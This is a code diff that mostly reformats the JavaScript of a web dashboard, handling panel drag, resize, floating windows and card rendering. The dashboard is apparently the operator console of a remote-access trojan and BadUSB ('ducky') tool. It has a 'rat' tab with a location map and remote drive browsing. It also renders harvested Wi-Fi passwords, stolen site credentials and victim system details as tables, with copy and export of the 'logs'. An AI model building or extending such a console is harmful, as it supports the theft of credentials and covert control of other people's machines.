-        : 'bg-neon text-white shadow-[0_0_15px_rgba(255,71,87,0.3)]';
-        
-    document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;
-
-    if (tabId === 'rat') {
-        if (!leafletMap) {
-            initMap();
-        } else {
-            setTimeout(() => leafletMap.invalidateSize(true), 100);
-        }
-    }
-};
-
-window.showToast = function(msg, type="success") {
-    const toast = document.getElementById('toast');
-    const icon = document.getElementById('toastIcon');
-    document.getElementById('toastMsg').innerText = msg;
-    
-    if (type === "error") {
-        toast.classList.replace('border-neon', 'border-red-500');
-        icon.className = "fa-solid fa-triangle-exclamation text-red-500";
-    } else {
-        toast.classList.replace('border-red-500', 'border-neon');
-        icon.className = "fa-solid fa-circle-check text-neon";
-    }
-    
-    toast.classList.replace('translate-y-24', 'translate-y-0');
-    toast.classList.replace('opacity-0', 'opacity-100');
-    
-    setTimeout(() => {
-        toast.classList.replace('translate-y-0', 'translate-y-24');
-        toast.classList.replace('opacity-100', 'opacity-0');
-    }, 3000);
+    if (lastSlash === -1) requestDirectoryListing('DRIVES');
+    else if (lastSlash === 2 && currentFsPath[1] === ':') requestDirectoryListing(currentFsPath.substring(0, lastSlash + 1));
+    else requestDirectoryListing(currentFsPath.substring(0, lastSlash));
 };
 
 // ==========================================
@@ -1037,14 +907,9 @@ function initDragAndDrop() {
 
     document.querySelectorAll('.draggable-header').forEach(header => {
         header.addEventListener('dragstart', (e) => {
-            if (isFloatingMode) { 
-                e.preventDefault(); 
-                return; 
-            } // Prevent native HTML5 drag in float mode
-            
+            if (isFloatingMode) { e.preventDefault(); return; }
             if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized') || e.target.tagName === 'SELECT' || e.target.tagName === 'INPUT') { 
-                e.preventDefault(); 
-                return; 
+                e.preventDefault(); return; 
             }
             draggedPanel = header.closest('.drag-panel');
             e.dataTransfer.effectAllowed = 'move';
@@ -1053,9 +918,7 @@ function initDragAndDrop() {
         });
         
         header.addEventListener('dragend', () => {
-            if(draggedPanel) {
-                draggedPanel.classList.remove('dragging');
-            }
+            if(draggedPanel) draggedPanel.classList.remove('dragging');
             draggedPanel = null;
             document.querySelectorAll('.drag-slot').forEach(s => s.classList.remove('drag-over'));
         });
@@ -1064,11 +927,8 @@ function initDragAndDrop() {
     document.querySelectorAll('.drag-slot').forEach(slot => {
         slot.addEventListener('dragover', (e) => {
             e.preventDefault(); 
-            if(draggedPanel && slot !== draggedPanel.parentElement) {
-                slot.classList.add('drag-over');
-            }
+            if(draggedPanel && slot !== draggedPanel.parentElement) slot.classList.add('drag-over');
         });
-        
         slot.addEventListener('dragleave', () => slot.classList.remove('drag-over'));
         
         slot.addEventListener('drop', (e) => {
@@ -1093,7 +953,6 @@ function initDragAndDrop() {
 function initResizers() {
     setupResizer('rz-v1', 'col-left', 'col-mid', true);
     setupResizer('rz-v2', 'col-mid', 'col-right', true);
-    
     setupResizer('rz-h-left', 'slot-1', 'slot-live', false);
     setupResizer('rz-h1', 'slot-2', 'slot-3', false);
     setupResizer('rz-h-right', 'slot-4', 'slot-fs', false);
@@ -1101,9 +960,7 @@ function initResizers() {
 
 function setupResizer(resizerId, prevId, nextId, isVertical) {
     const resizer = document.getElementById(resizerId);
-    if(!resizer) {
-        return; 
-    }
+    if(!resizer) return; 
     
     const prev = document.getElementById(prevId);
     const next = document.getElementById(nextId);
@@ -1111,12 +968,9 @@ function setupResizer(resizerId, prevId, nextId, isVertical) {
     resizer.addEventListener('mousedown', (e) => {
         e.preventDefault(); 
         resizer.classList.add('active');
-        
-        // Disable pointer-events globally to prevent Map/Iframe swallowing during drag
         document.body.classList.add('resizing-active'); 
 
-        prev.style.transition = 'none'; 
-        next.style.transition = 'none';
+        prev.style.transition = 'none'; next.style.transition = 'none';
 
         const startPos = isVertical ? e.clientX : e.clientY;
         const parentSize = isVertical ? resizer.parentElement.offsetWidth : resizer.parentElement.offsetHeight;
@@ -1131,26 +985,15 @@ function setupResizer(resizerId, prevId, nextId, isVertical) {
             let newNext = nextStartBasis - deltaPercent;
             
             if (newPrev > 15 && newNext > 15) {
-                prev.style.flexBasis = `${newPrev}%`;
-                next.style.flexBasis = `${newNext}%`;
-                
-                // CRITICAL FIX: Push exact width/height limits directly bypassing standard column flexbox %-bugs inside Chromium/Safari
-                if (isVertical) {
-                    prev.style.width = `${newPrev}%`;
-                    next.style.width = `${newNext}%`;
-                } else {
-                    prev.style.height = `${newPrev}%`;
-                    next.style.height = `${newNext}%`;
-                }
+                prev.style.flexBasis = `${newPrev}%`; next.style.flexBasis = `${newNext}%`;
+                if (isVertical) { prev.style.width = `${newPrev}%`; next.style.width = `${newNext}%`; } 
+                else { prev.style.height = `${newPrev}%`; next.style.height = `${newNext}%`; }
             }
         };
 
         const onMouseUp = () => {
-            resizer.classList.remove('active');
-            document.body.classList.remove('resizing-active'); // Cleanup
-            prev.style.transition = ''; 
-            next.style.transition = '';
-            
+            resizer.classList.remove('active'); document.body.classList.remove('resizing-active');
+            prev.style.transition = ''; next.style.transition = '';
             document.removeEventListener('mousemove', onMouseMove, true);
             document.removeEventListener('mouseup', onMouseUp, true);
         };
@@ -1163,10 +1006,7 @@ function setupResizer(resizerId, prevId, nextId, isVertical) {
 window.toggleMinimize = function(btn, panelId) {
     const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
     const panel = document.getElementById(panelId);
-    
-    if(!panel || panel.classList.contains('maximized')) {
-        return;
-    }
+    if(!panel || panel.classList.contains('maximized')) return;
 
     if (panel.dataset.minimized === 'true') {
         panel.dataset.minimized = 'false';
@@ -1182,17 +1022,13 @@ window.toggleMinimize = function(btn, panelId) {
 window.toggleMaximize = function(btn, panelId) {
     const buttonEl = btn.tagName === 'I' ? btn.parentElement : btn;
     const panel = document.getElementById(panelId);
-    if(!panel) {
-        return;
-    }
+    if(!panel) return;
     
     if (panel.classList.contains('maximized')) {
         panel.classList.remove('maximized');
         buttonEl.innerHTML = '<i class="fa-solid fa-expand"></i>';
     } else {
-        if(panel.dataset.minimized === 'true') {
-            toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, panelId);
-        }
+        if(panel.dataset.minimized === 'true') toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, panelId);
         bringToFrontFloat(panel);
         panel.classList.add('maximized');
         buttonEl.innerHTML = '<i class="fa-solid fa-compress"></i>';
@@ -1200,39 +1036,19 @@ window.toggleMaximize = function(btn, panelId) {
 };
 
 window.resetLayout = function() {
-    // If floating is active, turn it off and let the glide animation run before resetting grid
-    floatingStates = {}; // Wipe memory
-    if (isFloatingMode) {
-        toggleFloatingMode();
-    }
+    floatingStates = {}; 
+    if (isFloatingMode) toggleFloatingMode();
     
     const cols = ['col-left', 'col-mid', 'col-right'];
     const bases = ['25%', '50%', '25%'];
-    cols.forEach((id, i) => {
-        const el = document.getElementById(id);
-        if(el) { 
-            el.style.flexBasis = bases[i]; 
-            el.style.width = bases[i]; 
-        }
-    });
+    cols.forEach((id, i) => { const el = document.getElementById(id); if(el) { el.style.flexBasis = bases[i]; el.style.width = bases[i]; } });
     
     const slots = ['slot-1', 'slot-live', 'slot-2', 'slot-3', 'slot-4', 'slot-fs'];
-    slots.forEach(id => {
-        const el = document.getElementById(id);
-        if(el) {
-            el.style.flexBasis = '50%';
-            el.style.height = '50%';
-        }
-    });
+    slots.forEach(id => { const el = document.getElementById(id); if(el) { el.style.flexBasis = '50%'; el.style.height = '50%'; } });
     
-    document.querySelectorAll('.drag-panel').forEach(p => { 
-        p.classList.remove('maximized', 'collapsed'); 
-        p.dataset.minimized = 'false'; 
-    });
-    
+    document.querySelectorAll('.drag-panel').forEach(p => { p.classList.remove('maximized', 'collapsed'); p.dataset.minimized = 'false'; });
     document.querySelectorAll('.draggable-header button .fa-window-restore').forEach(i => i.className = "fa-solid fa-minus");
     document.querySelectorAll('.draggable-header button .fa-compress').forEach(i => i.className = "fa-solid fa-expand");
-    
     showToast('Layout Reset', 'success');
 };
 
@@ -1246,142 +1062,89 @@ window.toggleFloatingMode = function() {
     const wsRect = workspace.getBoundingClientRect();
 
     if (!isFloatingMode) {
-        // --- TURNING ON FLOATING MODE ---
         isFloatingMode = true;
-        btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: <span class="text-neon">ON</span>';
+        btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: ON';
         btn.classList.add('border-neon', 'text-white');
         btn.classList.remove('border-gray-700', 'text-gray-300');
         
-        // This is critical: Detaches slots from relative positioning, making workspace the anchor for absolute elements
         workspace.classList.add('floating-active'); 
 
         panels.forEach(p => {
-            // Step 1: Capture current visual position (Flex Grid origin)
             const rect = p.getBoundingClientRect();
             const startLeft = rect.left - wsRect.left;
             const startTop = rect.top - wsRect.top;
             const startWidth = rect.width;
             const startHeight = rect.height;
 
-            // Step 2: Apply floating classes
             p.classList.add('floating-panel');
+            p.style.left = startLeft + 'px'; p.style.top = startTop + 'px';
+            p.style.width = startWidth + 'px'; p.style.height = startHeight + 'px';
             
-            // Step 3: Immediately lock panels exactly where they are visually to prevent jumping
-            p.style.left = startLeft + 'px';
-            p.style.top = startTop + 'px';
-            p.style.width = startWidth + 'px';
-            p.style.height = startHeight + 'px';
-            
-            // Inject a resize handle into bottom right corner of panel
             if (!p.querySelector('.resize-handle')) {
-                const handle = document.createElement('div');
-                handle.className = 'resize-handle';
-                p.appendChild(handle);
+                const handle = document.createElement('div'); handle.className = 'resize-handle'; p.appendChild(handle);
             }
 
-            // Step 4: Check memory. Do we have a saved layout to GLIDE into?
             const saved = floatingStates[p.id];
             if (saved && !p.classList.contains('maximized')) {
-                p.offsetHeight; // Force reflow to acknowledge starting coordinates
-                p.classList.add('gliding'); // Add smooth CSS transitions
-                
-                // Set the target coordinates (The glide)
-                p.style.left = saved.left;
-                p.style.top = saved.top;
-                p.style.width = saved.width;
-                p.style.height = saved.height;
-                p.style.zIndex = saved.zIndex;
+                p.offsetHeight; p.classList.add('gliding'); 
+                p.style.left = saved.left; p.style.top = saved.top;
+                p.style.width = saved.width; p.style.height = saved.height; p.style.zIndex = saved.zIndex;
+                setTimeout(() => p.classList.remove('gliding'), 400); 
+            } else { p.style.zIndex = ++floatZIndex; }
 
-                setTimeout(() => p.classList.remove('gliding'), 400); // Clean up transitions after 400ms
-            } else {
-                p.style.zIndex = ++floatZIndex;
-            }
-
-            // Step 5: Disable the native HTML5 drag-and-drop to let free-dragging work
             const header = p.querySelector('.draggable-header');
             if (header) header.setAttribute('draggable', 'false');
         });
-
         showToast('Free Floating Mode Enabled', 'success');
-
     } else {
-        // --- TURNING OFF FLOATING MODE (GLIDING BACK TO GRID) ---
         isFloatingMode = false;
         btn.innerHTML = '<i class="fa-solid fa-clone mr-1"></i> Float: OFF';
-        btn.classList.remove('border-neon', 'text-white');
-        btn.classList.add('border-gray-700', 'text-gray-300');
+        btn.classList.remove('border-neon', 'text-white'); btn.classList.add('border-gray-700', 'text-gray-300');
 
-        // FLIP ANIMATION TECHNIQUE: (First, Last, Invert, Play)
-        
-        // 1. FIRST: Capture current floating layout and save to memory
         const firstRects = new Map();
         panels.forEach(p => {
             const rect = p.getBoundingClientRect();
             firstRects.set(p, { left: rect.left - wsRect.left, top: rect.top - wsRect.top, width: rect.width, height: rect.height });
-            
-            if (!p.classList.contains('maximized')) {
-                floatingStates[p.id] = {
-                    left: p.style.left,
-                    top: p.style.top,
-                    width: p.style.width,
-                    height: p.style.height,
-                    zIndex: p.style.zIndex
-                };
-            }
+            if (!p.classList.contains('maximized')) floatingStates[p.id] = { left: p.style.left, top: p.style.top, width: p.style.width, height: p.style.height, zIndex: p.style.zIndex };
         });
 
-        // 2. Clear floating rules instantly to let browser calculate native Flex Grid layout
         workspace.classList.remove('floating-active');
         panels.forEach(p => {
             p.classList.remove('floating-panel');
             p.style.left = ''; p.style.top = ''; p.style.width = ''; p.style.height = ''; p.style.zIndex = '';
-            const handle = p.querySelector('.resize-handle');
-            if (handle) handle.remove();
+            const handle = p.querySelector('.resize-handle'); if (handle) handle.remove();
         });
 
-        // 3. LAST: Capture where the Flex Grid naturally puts them
         const lastRects = new Map();
         panels.forEach(p => {
             const rect = p.getBoundingClientRect();
             lastRects.set(p, { left: rect.left - wsRect.left, top: rect.top - wsRect.top, width: rect.width, height: rect.height });
         });
 
-        // 4. INVERT: Instantly force them BACK into floating mode at their FIRST positions
         workspace.classList.add('floating-active');
         panels.forEach(p => {
-            const first = firstRects.get(p);
-            p.classList.add('floating-panel');
-            p.style.left = first.left + 'px';
-            p.style.top = first.top + 'px';
-            p.style.width = first.width + 'px';
-            p.style.height = first.height + 'px';
+            const first = firstRects.get(p); p.classList.add('floating-panel');
+            p.style.left = first.left + 'px'; p.style.top = first.top + 'px';
+            p.style.width = first.width + 'px'; p.style.height = first.height + 'px';
         });
 
-        // 5. PLAY: Add glide transition and aim for the LAST positions
         panels.forEach(p => {
-            p.offsetHeight; // Force reflow
-            p.classList.add('gliding');
+            p.offsetHeight; p.classList.add('gliding');
             const last = lastRects.get(p);
-            p.style.left = last.left + 'px';
-            p.style.top = last.top + 'px';
-            p.style.width = last.width + 'px';
-            p.style.height = last.height + 'px';
+            p.style.left = last.left + 'px'; p.style.top = last.top + 'px';
+            p.style.width = last.width + 'px'; p.style.height = last.height + 'px';
         });
 
-        // 6. Cleanup: Once transition is over (400ms), truly restore natural Flex layout
         setTimeout(() => {
             workspace.classList.remove('floating-active');
             panels.forEach(p => {
                 p.classList.remove('gliding', 'floating-panel');
                 p.style.left = ''; p.style.top = ''; p.style.width = ''; p.style.height = '';
-                
                 const header = p.querySelector('.draggable-header');
                 if (header) header.setAttribute('draggable', 'true');
             });
-            // Poke Leaflet to fix its size safely
             if (leafletMap) leafletMap.invalidateSize(true);
         }, 400);
-
         showToast('Grid Tiling Layout Restored', 'success');
     }
 };
@@ -1389,70 +1152,42 @@ window.toggleFloatingMode = function() {
 function initFloatingWindowManager() {
     document.addEventListener('mousedown', (e) => {
         if (!isFloatingMode) return;
-        
         const resizeHandle = e.target.closest('.resize-handle');
         const header = e.target.closest('.draggable-header');
         
         if (resizeHandle) {
             const panel = resizeHandle.closest('.drag-panel');
             if (panel.classList.contains('maximized') || panel.classList.contains('collapsed')) return;
-            
-            isResizingFloat = true;
-            activeFloatPanel = panel;
-            bringToFrontFloat(activeFloatPanel);
-            
-            floatStartX = e.clientX;
-            floatStartY = e.clientY;
+            isResizingFloat = true; activeFloatPanel = panel; bringToFrontFloat(activeFloatPanel);
+            floatStartX = e.clientX; floatStartY = e.clientY;
             const rect = activeFloatPanel.getBoundingClientRect();
-            panelStartWidth = rect.width;
-            panelStartHeight = rect.height;
-            e.preventDefault();
-            
+            panelStartWidth = rect.width; panelStartHeight = rect.height; e.preventDefault();
         } else if (header && !e.target.closest('button') && !e.target.closest('select') && !e.target.closest('input')) {
             const panel = header.closest('.drag-panel');
             if (panel.classList.contains('maximized')) return;
-            
-            isDraggingFloat = true;
-            activeFloatPanel = panel;
-            bringToFrontFloat(activeFloatPanel);
-            
-            floatStartX = e.clientX;
-            floatStartY = e.clientY;
-            panelStartLeft = parseFloat(activeFloatPanel.style.left) || 0;
-            panelStartTop = parseFloat(activeFloatPanel.style.top) || 0;
-            e.preventDefault();
+            isDraggingFloat = true; activeFloatPanel = panel; bringToFrontFloat(activeFloatPanel);
+            floatStartX = e.clientX; floatStartY = e.clientY;
+            panelStartLeft = parseFloat(activeFloatPanel.style.left) || 0; panelStartTop = parseFloat(activeFloatPanel.style.top) || 0; e.preventDefault();
         }
     });
 
     document.addEventListener('mousemove', (e) => {
         if (!isFloatingMode || !activeFloatPanel) return;
-        
         if (isDraggingFloat) {
-            const dx = e.clientX - floatStartX;
-            const dy = e.clientY - floatStartY;
-            activeFloatPanel.style.left = `${panelStartLeft + dx}px`;
-            activeFloatPanel.style.top = `${panelStartTop + dy}px`;
+            const dx = e.clientX - floatStartX; const dy = e.clientY - floatStartY;
+            activeFloatPanel.style.left = `${panelStartLeft + dx}px`; activeFloatPanel.style.top = `${panelStartTop + dy}px`;
         } else if (isResizingFloat) {
-            const dx = e.clientX - floatStartX;
-            const dy = e.clientY - floatStartY;
-            activeFloatPanel.style.width = `${Math.max(250, panelStartWidth + dx)}px`;
-            activeFloatPanel.style.height = `${Math.max(150, panelStartHeight + dy)}px`;
+            const dx = e.clientX - floatStartX; const dy = e.clientY - floatStartY;
+            activeFloatPanel.style.width = `${Math.max(250, panelStartWidth + dx)}px`; activeFloatPanel.style.height = `${Math.max(150, panelStartHeight + dy)}px`;
         }
     });
 
     document.addEventListener('mouseup', () => {
-        if (isDraggingFloat || isResizingFloat) {
-            isDraggingFloat = false;
-            isResizingFloat = false;
-            activeFloatPanel = null;
-        }
+        if (isDraggingFloat || isResizingFloat) { isDraggingFloat = false; isResizingFloat = false; activeFloatPanel = null; }
     });
 }
 
-function bringToFrontFloat(panel) {
-    if(!isFloatingMode) return;
-    panel.style.zIndex = ++floatZIndex;
-}
+function bringToFrontFloat(panel) { if(!isFloatingMode) return; panel.style.zIndex = ++floatZIndex; }
 
 // ==========================================
 // VAULT CARD RENDERING
@@ -1479,11 +1214,8 @@ function createFilterBtn(text, isActive) {
         document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${inactiveClasses}`);
         btn.className = `px-5 py-2 rounded border text-xs font-mono transition-all duration-200 filter-btn ${activeClasses}`;
         
-        if (text === 'All') {
-            renderCards(globalData, document.getElementById('output'));
-        } else {
-            renderCards(globalData.filter(item => item.category === text), document.getElementById('output'));
-        }
+        if (text === 'All') renderCards(globalData, document.getElementById('output'));
+        else renderCards(globalData.filter(item => item.category === text), document.getElementById('output'));
     };
     return btn;
 }
@@ -1492,8 +1224,7 @@ function renderCards(data, outputDiv) {
     outputDiv.innerHTML = '';
     
     data.forEach((item, index) => {
-        let icon = 'fa-file-code'; 
-        let color = 'text-neon';
+        let icon = 'fa-file-code'; let color = 'text-neon';
         
         if(item.category.includes('Wi-Fi')) { icon = 'fa-wifi'; color = 'text-blue-400'; }
         if(item.category.includes('System')) { icon = 'fa-server'; color = 'text-green-400'; }
@@ -1515,22 +1246,14 @@ function renderCards(data, outputDiv) {
                         <h3 class="font-bold text-gray-200 text-xs uppercase tracking-widest">${item.category}</h3>
                     </div>
                     <div class="flex gap-2">
-                        <button onclick="toggleMinimize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]">
-                            <i class="fa-solid fa-minus"></i>
-                        </button>
-                        <button onclick="toggleMaximize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]">
-                            <i class="fa-solid fa-expand"></i>
-                        </button>
+                        <button onclick="toggleMinimize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
+                        <button onclick="toggleMaximize(this, '${panelId}')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                     </div>
                 </div>
                 <div class="win-content flex flex-col bg-[#0f1423] rounded-b-[0.75rem] h-full relative">
                     <div class="absolute top-2 right-2 z-10 flex gap-2">
-                        <span class="text-[10px] font-mono text-gray-500 bg-black/60 px-2 py-1 rounded">
-                            ${new Date(item.created_at).toLocaleDateString()}
-                        </span>
-                        <button onclick="copyData(this)" class="bg-gray-800 hover:bg-gray-700 text-white rounded px-2 py-1 transition-colors text-[10px]" title="Copy Raw">
-                            <i class="fa-regular fa-copy"></i>
-                        </button>
+                        <span class="text-[10px] font-mono text-gray-500 bg-black/60 px-2 py-1 rounded">${new Date(item.created_at).toLocaleDateString()}</span>
+                        <button onclick="copyData(this)" class="bg-gray-800 hover:bg-gray-700 text-white rounded px-2 py-1 transition-colors text-[10px]" title="Copy Raw"><i class="fa-regular fa-copy"></i></button>
                     </div>
                     <div class="p-0 flex-grow overflow-y-auto mt-6">
                         <textarea class="hidden-raw-data hidden">${item.content}</textarea>
@@ -1541,41 +1264,20 @@ function renderCards(data, outputDiv) {
         `;
         outputDiv.appendChild(slot);
     });
-    
     initDragAndDrop(); 
 }
 
 function parseToHTML(category, content) {
     let defaultRaw = `<pre class="p-4 font-mono text-xs text-cyberBlue whitespace-pre-wrap break-all">${escapeHtml(content)}</pre>`;
-    
     try {
         if (category.includes('Wi-Fi')) {
             const blocks = content.split(/-{10,}/).filter(b => b.trim().length > 0);
             let rows = blocks.map(block => {
                 let ssid = (block.match(/SSID:\s*(.*)/i) || [])[1] || 'Unknown';
                 let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
-                
-                return `
-                    <tr class="border-b border-gray-800/50 hover:bg-white/5">
-                        <td class="px-4 py-2.5 text-blue-400 font-bold w-1/2 break-all">${escapeHtml(ssid)}</td>
-                        <td class="px-4 py-2.5 font-mono text-white blur-reveal rounded w-1/2 break-all">${escapeHtml(pass)}</td>
-                    </tr>
-                `;
+                return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="px-4 py-2.5 text-blue-400 font-bold w-1/2 break-all">${escapeHtml(ssid)}</td><td class="px-4 py-2.5 font-mono text-white blur-reveal rounded w-1/2 break-all">${escapeHtml(pass)}</td></tr>`;
             }).join('');
-            
-            if (rows) {
-                return `
-                    <table class="w-full text-left text-xs table-fixed">
-                        <thead class="bg-[#050810] text-gray-500">
-                            <tr>
-                                <th class="p-2 pl-4 w-1/2">Network (SSID)</th>
-                                <th class="p-2 w-1/2">Password</th>
-                            </tr>
-                        </thead>
-                        <tbody>${rows}</tbody>
-                    </table>
-                `;
-            }
+            if (rows) return `<table class="w-full text-left text-xs table-fixed"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2 pl-4 w-1/2">Network (SSID)</th><th class="p-2 w-1/2">Password</th></tr></thead><tbody>${rows}</tbody></table>`;
         }
         
         if (category.includes('Password') || category.includes('Cred')) {
@@ -1584,70 +1286,29 @@ function parseToHTML(category, content) {
                 let url = (block.match(/(?:URL|HOST):\s*(.*)/i) || [])[1] || 'N/A';
                 let user = (block.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
                 let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
-                
-                return `
-                    <tr class="border-b border-gray-800/50 hover:bg-white/5">
-                        <td class="p-2 pl-3 text-yellow-400 truncate w-1/3" title="${escapeHtml(url)}">${escapeHtml(url)}</td>
-                        <td class="p-2 text-gray-300 truncate w-1/3">${escapeHtml(user)}</td>
-                        <td class="p-2 font-mono text-white blur-reveal rounded w-1/3 truncate">${escapeHtml(pass)}</td>
-                    </tr>
-                `;
+                return `<tr class="border-b border-gray-800/50 hover:bg-white/5"><td class="p-2 pl-3 text-yellow-400 truncate w-1/3" title="${escapeHtml(url)}">${escapeHtml(url)}</td><td class="p-2 text-gray-300 truncate w-1/3">${escapeHtml(user)}</td><td class="p-2 font-mono text-white blur-reveal rounded w-1/3 truncate">${escapeHtml(pass)}</td></tr>`;
             }).join('');
-            
-            if (rows) {
-                return `
-                    <table class="w-full text-left text-xs table-fixed">
-                        <thead class="bg-[#050810] text-gray-500">
-                            <tr>
-                                <th class="p-2 pl-3 w-1/3">Target</th>
-                                <th class="p-2 w-1/3">User</th>
-                                <th class="p-2 w-1/3">Pass</th>
-                            </tr>
-                        </thead>
-                        <tbody>${rows}</tbody>
-                    </table>
-                `;
-            }
+            if (rows) return `<table class="w-full text-left text-xs table-fixed"><thead class="bg-[#050810] text-gray-500"><tr><th class="p-2 pl-3 w-1/3">Target</th><th class="p-2 w-1/3">User</th><th class="p-2 w-1/3">Pass</th></tr></thead><tbody>${rows}</tbody></table>`;
         }
         
         if (category.includes('System')) {
             const lines = content.split('\n').filter(l => l.trim().length > 0);
             let gridItems = lines.map(line => {
                 let parts = line.includes(':') ? line.split(':') : line.split('=');
-                
                 if (parts.length >= 2) {
-                    let key = parts.shift().trim(); 
-                    let val = parts.join(':').trim();
-                    
-                    return `
-                        <div class="bg-[#050810] p-2.5 rounded border border-gray-800/80">
-                            <div class="text-gray-500 text-[9px] font-bold uppercase tracking-wider mb-0.5">${escapeHtml(key)}</div>
-                            <div class="text-green-400 font-mono text-[11px] truncate">${escapeHtml(val)}</div>
-                        </div>
-                    `;
+                    let key = parts.shift().trim(); let val = parts.join(':').trim();
+                    return `<div class="bg-[#050810] p-2.5 rounded border border-gray-800/80"><div class="text-gray-500 text-[9px] font-bold uppercase tracking-wider mb-0.5">${escapeHtml(key)}</div><div class="text-green-400 font-mono text-[11px] truncate">${escapeHtml(val)}</div></div>`;
                 } 
                 return '';
             }).join('');
-            
-            if (gridItems) {
-                return `<div class="p-3 grid grid-cols-2 gap-2">${gridItems}</div>`;
-            }
+            if (gridItems) return `<div class="p-3 grid grid-cols-2 gap-2">${gridItems}</div>`;
         }
-        
-    } catch (e) { 
-        return defaultRaw; 
-    }
-    
+    } catch (e) { return defaultRaw; }
     return defaultRaw;
 }
 
 function escapeHtml(unsafe) { 
-    return unsafe
-         .replace(/&/g, "&amp;")
-         .replace(/</g, "&lt;")
-         .replace(/>/g, "&gt;")
-         .replace(/"/g, "&quot;")
-         .replace(/'/g, "&#039;");
+    return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
 }
 
 window.copyData = function(btnElement) {
@@ -1656,31 +1317,19 @@ window.copyData = function(btnElement) {
         showToast("Raw payload copied to clipboard");
         const icon = btnElement.querySelector('i');
         icon.className = "fa-solid fa-check text-green-400";
-        
-        setTimeout(() => {
-            icon.className = "fa-regular fa-copy";
-        }, 2000);
+        setTimeout(() => { icon.className = "fa-regular fa-copy"; }, 2000);
     });
 };
 
 window.exportLogs = function() {
-    if (globalData.length === 0) {
-        return showToast("No data to export.", "error");
-    }
+    if (globalData.length === 0) return showToast("No data to export.", "error");
     
     const deviceId = document.getElementById('deviceId').value.trim() || 'export';
     const jsonData = JSON.stringify(globalData, null, 2);
     const blob = new Blob([jsonData], { type: 'application/json' });
     const url = URL.createObjectURL(blob);
     
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `ducky_logs_${deviceId}.json`;
-    
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-    
+    const a = document.createElement('a'); a.href = url; a.download = `ducky_logs_${deviceId}.json`;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
     showToast("Logs exported.");
 };
